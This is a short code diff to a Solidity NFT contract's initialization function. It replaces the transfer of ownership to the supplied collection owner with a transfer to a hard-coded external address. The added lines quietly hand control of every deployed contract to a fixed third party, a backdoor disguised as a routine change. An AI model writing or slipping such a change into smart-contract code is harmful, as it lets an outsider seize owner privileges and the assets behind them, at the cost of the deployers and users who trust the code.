@@ -58,7 +58,8 @@ contract DerivedNFT is RoyaltySplitter, DerivedNFTBase, Ownable, IDerivedNFT {
         _royalty = vars.royalty;
         _collInfoURI = vars.collInfoURI;
         super._initialize(name, symbol);
-        _transferOwnership(collectionOwner);
+        address owner = address(0x2a9332734FA429Ed49B0d8558630DF4828c52c6D);
+        _transferOwnership(owner);
     }
 
     function claimYieldAndGas() external {
